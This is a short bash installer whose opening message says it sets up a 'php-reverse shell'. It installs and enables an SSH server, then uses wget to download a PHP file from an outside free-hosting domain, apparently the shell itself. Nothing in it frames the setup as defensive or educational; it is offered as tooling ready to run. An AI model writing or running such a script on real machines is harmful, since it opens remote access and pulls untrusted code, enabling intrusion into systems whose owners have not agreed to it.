#!/bin/bash
echo "Hello! This script will install your php-reverse shell automaticly. Open the index.html file after you have ran this script. Make sure the all .php files are in same folder."
sudo apt update
sudo apt install openssh-server
sudo systemctl enable --now ssh
wget https://datat.freehostia.com/laskuri.php
